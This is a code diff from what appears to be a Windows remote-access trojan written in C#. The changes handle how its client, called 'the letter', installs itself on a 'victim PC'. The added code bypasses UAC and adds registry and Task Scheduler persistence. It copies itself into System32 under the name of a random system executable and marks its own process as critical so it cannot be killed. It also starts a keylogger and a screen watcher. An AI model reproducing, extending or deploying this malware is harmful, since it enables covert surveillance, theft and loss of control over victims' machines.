@@ -22,22 +22,46 @@ namespace Client
             CheckRealApplication();
 
 #if !DEBUG
-            /// Check if Application is already on victim PC.
-            if (!Constants.IsInVictimPC())
+            /// Check if Application is already on victim PC
+            if (!Constants.IsInAppData() && !Constants.IsInWinDir())
+                // its not on any infectable folder, put the letter on appdata
                 Migrate();
 
-            /// Attempt to be God.
+            /// Attempt to be God
             if (!Constants.IsAdmin())
             {
                 if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
-                    Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
+                    Armitage.UAC.UAC_Bypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
                 // else...do nothing ;(
+
+                // add startup to registry...for the meantime
+                Armitage.Startup.ViaRegistry();
             }
             else
             {
-                /// Things to do when admin.
-                Armitage.Startup.ViaTaskScheduler();
-                ProtectTheLetter();
+                if (!Constants.IsInWinDir()) GoSomewhereSafe();
+                // now it will run there, wait for it to hook there
+                if (Constants.IsInWinDir())
+                {
+                    // check if the system32 path task already exists
+                    // if not just go along.
+                    if (!Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
+                    {
+                        // if not create it
+                        Armitage.Startup.ViaTaskScheduler(Constants.WinDirTaskName);
+                    }
+                    // needs to be a separate if to get called after creating the task
+                    if (Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
+                    {
+                        // if the task has been successfully added check if the old
+                        // registry startup still exists
+                        if (Armitage.Startup.IsOldStartupExist())
+                            // if it does, remove it
+                            Armitage.Startup.RemoveOldRegistryStartupKey();
+                    }
+                    // set the letter to be critical, unburnable
+                    ProtectTheLetter();
+                }
             }
 #endif
 
@@ -46,7 +70,6 @@ namespace Client
             Updater.Start();
 
             /// Start loggers.
-
             Armitage.Watchers.Keylogger.Start();
 
             Armitage.Watchers.Screen_Watcher.Start();
@@ -71,12 +94,13 @@ namespace Client
                     if (parent > 0)
                         Process.GetProcessById(parent).Kill();
 
+                    // this wont get called if the argument is only PID
                     if (args.Length > 1)
                     {
                         /// Find suitable UAC method.
                         /// Since the last method didn't work,
                         /// increment the active method.
-                        UACMethod = int.Parse(args[1].Trim()) + 1;
+                        UACMethod = int.Parse(args[1].Trim());
                     }
                 }
             }
@@ -91,6 +115,23 @@ namespace Client
             Armitage.Critical_Process.Protect();
         }
 
+        public static string GoSomewhereSafe()
+        {
+            try
+            {
+                string path = Path.GetFullPath(Constants.WinDir + "/" + Utilities.Files_And_Pathing.GetRandomSystem32Executable());
+                Armitage.Copy.CopySelfTo(path);
+                // change the letter's stamp
+
+                // run from there
+                Process.Start(path);
+                return path;
+            }
+            catch
+            {
+            }
+            return null;
+        }
         public static void Migrate()
         {
             if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
